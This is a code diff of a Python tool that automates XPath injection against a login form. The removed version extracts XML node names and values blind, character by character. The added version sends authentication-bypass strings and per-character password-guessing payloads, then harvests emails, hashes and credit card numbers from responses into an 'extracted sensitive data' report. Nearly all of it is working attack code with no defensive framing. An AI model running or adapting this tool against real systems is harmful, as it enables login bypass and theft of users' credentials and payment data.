@@ -1,141 +1,224 @@
+from abc import ABC, abstractmethod
+from typing import List, Optional, Dict, Any
+from dataclasses import dataclass
 import requests
-import time
-import string
+import re
 import logging
-import json
-import argparse
-import asyncio
-import aiohttp
+from datetime import datetime
+from functools import wraps
+import time
+import random
+from enum import Enum
 
-# Configure logging
-logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+class InjectionType(Enum):
+    AUTHENTICATION = "auth"
+    DATA_EXTRACTION = "data"
+    ERROR_BASED = "error"
+    BLIND = "blind"
 
-# Function to test the XPath injection payload
-def test_xpath_payload(payload, url, timeout=5):
-    try:
-        data = {'username': payload}
-        start_time = time.time()
-        response = requests.post(url, data=data, timeout=timeout)
-        end_time = time.time()
-        response_time = end_time - start_time
-        logging.debug(f"Payload: {payload} | Response: {response.text[:100]} | Time: {response_time}s")
-        return response.text, response_time
-    except requests.Timeout:
-        logging.warning(f"Request timed out for payload: {payload}")
-        return "", 0
-    except requests.RequestException as e:
-        logging.error(f"Request failed: {e}")
-        return "", 0
+@dataclass
+class InjectionResult:
+    success: bool
+    payload: str
+    response_data: Optional[str]
+    execution_time: float
+    vulnerability_type: InjectionType
 
-# Function to determine the length of a node's name
-def find_node_length(xpath_expression, url, max_length=50):
-    length = 1
-    while length <= max_length:
-        payload = f"invalid' or string-length({xpath_expression})={length} and '1'='1"
-        response_text, response_time = test_xpath_payload(payload, url)
-        if "Success" in response_text or response_time > response_time_threshold:
-            return length
-        length += 1
-    return -1  # Return -1 if the length exceeds max_length without success
+class InjectionException(Exception):
+    pass
 
-# Function to extract a node's name or value
-def extract_node_name_or_value(xpath_expression, length, url):
-    node_name_or_value = ''
-    common_chars = string.ascii_lowercase + string.digits  # Optimize with more common characters first
-    for position in range(1, length + 1):
-        for char in common_chars:
-            payload = f"invalid' or substring({xpath_expression},{position},1)='{char}' and '1'='1"
-            response_text, response_time = test_xpath_payload(payload, url)
-            if "Success" in response_text or response_time > response_time_threshold:
-                node_name_or_value += char
-                break
-    return node_name_or_value
+def retry_on_failure(max_attempts: int = 3, delay: float = 1.0):
+    def decorator(func):
+        @wraps(func)
+        def wrapper(*args, **kwargs):
+            for attempt in range(max_attempts):
+                try:
+                    return func(*args, **kwargs)
+                except Exception as e:
+                    if attempt == max_attempts - 1:
+                        raise InjectionException(f"Max attempts reached: {str(e)}")
+                    time.sleep(delay * (attempt + 1))
+            return None
+        return wrapper
+    return decorator
 
-# Function to count child nodes of a given node
-def count_child_nodes(parent_node, url):
-    count = 1
-    while True:
-        payload = f"invalid' or count({parent_node}/*)={count} and '1'='1"
-        response_text, response_time = test_xpath_payload(payload, url)
-        if "Success" in response_text or response_time > response_time_threshold:
-            count += 1
-        else:
-            return count - 1
+class LoggingMixin:
+    def __init__(self):
+        self.logger = logging.getLogger(self.__class__.__name__)
+        self.logger.setLevel(logging.INFO)
+        
+    def log_injection_attempt(self, payload: str, result: bool):
+        self.logger.info(f"Injection attempt: {payload} - Success: {result}")
 
-# Function to extract child node names
-def extract_child_node_names(parent_node, child_count, url):
-    child_node_names = []
-    for i in range(1, child_count + 1):
-        xpath_expression = f"{parent_node}[{i}]"
-        length = find_node_length(f"name({xpath_expression})", url)
-        child_node_name = extract_node_name_or_value(f"name({xpath_expression})", length, url)
-        child_node_names.append(child_node_name)
-    return child_node_names
+class TimingMixin:
+    @staticmethod
+    def measure_execution_time(func):
+        @wraps(func)
+        def wrapper(*args, **kwargs):
+            start_time = time.time()
+            result = func(*args, **kwargs)
+            execution_time = time.time() - start_time
+            return result, execution_time
+        return wrapper
 
-# Function to extract node values
-def extract_node_values(parent_node, child_count, url):
-    node_values = []
-    for i in range(1, child_count + 1):
-        xpath_expression = f"{parent_node}[{i}]"
-        length = find_node_length(xpath_expression, url)
-        node_value = extract_node_name_or_value(xpath_expression, length, url)
-        node_values.append(node_value)
-    return node_values
+class BaseInjector(ABC):
+    @abstractmethod
+    def generate_payload(self) -> str:
+        pass
 
-# Function to generate a report
-def generate_report(data, filename='report.json'):
-    with open(filename, 'w') as f:
-        json.dump(data, f, indent=4)
+    @abstractmethod
+    def execute_injection(self, payload: str) -> InjectionResult:
+        pass
 
-# Function to parse command-line arguments
-def parse_arguments():
-    parser = argparse.ArgumentParser(description="Test XPath injection vulnerabilities.")
-    parser.add_argument('--url', type=str, required=True, help="The target URL for testing.")
-    parser.add_argument('--timeout', type=int, default=5, help="Timeout for HTTP requests.")
-    parser.add_argument('--threshold', type=float, default=1.0, help="Response time threshold for detection.")
-    parser.add_argument('--simulate', action='store_true', help="Run in simulation mode without making actual requests.")
-    return parser.parse_args()
+class PayloadGenerator(ABC):
+    @abstractmethod
+    def generate(self) -> List[str]:
+        pass
 
-# Main function to find and print the root node's name and child nodes
-async def main(url, timeout, response_time_threshold, simulate):
-    if simulate:
-        print(f"Simulating with URL: {url}")
-        # Output the payloads being tested without actually sending the request
-        return
+class AuthenticationPayloadGenerator(PayloadGenerator):
+    def generate(self) -> List[str]:
+        return [
+            "' or '1'='1",
+            "' or 1=1--",
+            "admin' or '1'='1' %00",
+            "' or 1=1 and '1'='1",
+            "admin')) or (('1'='1"
+        ]
 
-    # Find and extract root node name
-    root_node_length = find_node_length("name(/*[1])", url)
-    print(f"Length of the root node's name: {root_node_length}")
-    root_node_name = extract_node_name_or_value("name(/*[1])", root_node_length, url)
-    print(f"Root node's name: {root_node_name}")
+class BlindInjectionPayloadGenerator(PayloadGenerator):
+    def generate(self) -> List[str]:
+        return [
+            f"' or substring((//user[position()=1]/password),1,1)='{char}'"
+            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+        ]
 
-    # Explore child nodes
-    parent_node = f"/{root_node_name}"
-    child_count = count_child_nodes(parent_node, url)
-    print(f"Number of child nodes: {child_count}")
-
-    if child_count > 0:
-        child_node_names = extract_child_node_names(parent_node, child_count, url)
-        print("Child node names:")
-        for name in child_node_names:
-            print(f"  - {name}")
-
-        # Extract values of child nodes
-        child_node_values = extract_node_values(parent_node, child_count, url)
-        print("Child node values:")
-        for value in child_node_values:
-            print(f"  - {value}")
-
-        # Generate a report
-        report_data = {
-            'root_node_name': root_node_name,
-            'child_node_names': child_node_names,
-            'child_node_values': child_node_values
+class XPathInjector(BaseInjector, LoggingMixin, TimingMixin):
+    def __init__(self, target_url: str):
+        super().__init__()
+        self.target_url = target_url
+        self.session = requests.Session()
+        self.successful_payloads: List[InjectionResult] = []
+        self.payload_generators: Dict[InjectionType, PayloadGenerator] = {
+            InjectionType.AUTHENTICATION: AuthenticationPayloadGenerator(),
+            InjectionType.BLIND: BlindInjectionPayloadGenerator()
         }
-        generate_report(report_data)
+
+    @retry_on_failure(max_attempts=3)
+    def execute_injection(self, payload: str) -> InjectionResult:
+        result, execution_time = self.measure_execution_time(self._send_request)(payload)
+        
+        injection_result = InjectionResult(
+            success=self._check_success(result),
+            payload=payload,
+            response_data=self._extract_data(result),
+            execution_time=execution_time,
+            vulnerability_type=self._determine_vulnerability_type(payload)
+        )
+        
+        self.log_injection_attempt(payload, injection_result.success)
+        
+        if injection_result.success:
+            self.successful_payloads.append(injection_result)
+            
+        return injection_result
+
+    def _send_request(self, payload: str) -> requests.Response:
+        data = {
+            "username": payload,
+            "password": "anything"
+        }
+        return self.session.post(self.target_url, data=data)
+
+    def _check_success(self, response: requests.Response) -> bool:
+        success_indicators = ["Welcome", "Dashboard", "Profile", "Admin"]
+        return any(indicator in response.text for indicator in success_indicators)
+
+    def _extract_data(self, response: requests.Response) -> Optional[str]:
+        patterns = {
+            'email': r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}',
+            'hash': r'[A-Fa-f0-9]{32,64}',
+            'credit_card': r'\b\d{16}\b'
+        }
+        
+        extracted_data = {}
+        for key, pattern in patterns.items():
+            if matches := re.findall(pattern, response.text):
+                extracted_data[key] = matches
+                
+        return str(extracted_data) if extracted_data else None
+
+    def _determine_vulnerability_type(self, payload: str) -> InjectionType:
+        if "substring" in payload or "count" in payload:
+            return InjectionType.BLIND
+        if "or" in payload and "=" in payload:
+            return InjectionType.AUTHENTICATION
+        if "div" in payload or "invalid" in payload:
+            return InjectionType.ERROR_BASED
+        return InjectionType.DATA_EXTRACTION
+
+class AutomatedInjector:
+    def __init__(self, injector: XPathInjector):
+        self.injector = injector
+        self.results: List[InjectionResult] = []
+
+    def run_campaign(self) -> None:
+        for injection_type in InjectionType:
+            if generator := self.injector.payload_generators.get(injection_type):
+                payloads = generator.generate()
+                for payload in payloads:
+                    try:
+                        result = self.injector.execute_injection(payload)
+                        self.results.append(result)
+                    except InjectionException as e:
+                        logging.error(f"Failed to execute {payload}: {str(e)}")
+
+    def generate_report(self) -> Dict[str, Any]:
+        successful_attacks = [r for r in self.results if r.success]
+        
+        return {
+            "total_attempts": len(self.results),
+            "successful_attempts": len(successful_attacks),
+            "success_rate": len(successful_attacks) / len(self.results) if self.results else 0,
+            "vulnerable_types": set(r.vulnerability_type for r in successful_attacks),
+            "fastest_successful_payload": min(successful_attacks, key=lambda x: x.execution_time) if successful_attacks else None,
+            "extracted_data": [r.response_data for r in successful_attacks if r.response_data]
+        }
+
+def main():
+    # Настройка логирования
+    logging.basicConfig(
+        level=logging.INFO,
+        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+    )
+
+    # Создание и настройка инжектора
+    target_url = "http://vulnerable-site.com/login"
+    injector = XPathInjector(target_url)
+    
+    # Создание автоматизированного тестировщика
+    automated_injector = AutomatedInjector(injector)
+    
+    print("Starting automated XPath injection campaign...")
+    automated_injector.run_campaign()
+    
+    # Генерация и вывод отчета
+    report = automated_injector.generate_report()
+    print("\nCampaign Results:")
+    print(f"Total attempts: {report['total_attempts']}")
+    print(f"Successful attempts: {report['successful_attempts']}")
+    print(f"Success rate: {report['success_rate']:.2%}")
+    print("\nVulnerable types found:")
+    for vuln_type in report['vulnerable_types']:
+        print(f"- {vuln_type.value}")
+    
+    if report['fastest_successful_payload']:
+        print(f"\nFastest successful payload: {report['fastest_successful_payload'].payload}")
+        print(f"Execution time: {report['fastest_successful_payload'].execution_time:.3f} seconds")
+    
+    if report['extracted_data']:
+        print("\nExtracted sensitive data:")
+        for data in report['extracted_data']:
+            print(f"- {data}")
 
 if __name__ == "__main__":
-    args = parse_arguments()
-    response_time_threshold = args.threshold
-    asyncio.run(main(args.url, args.timeout, response_time_threshold, args.simulate))
-)
+    main()
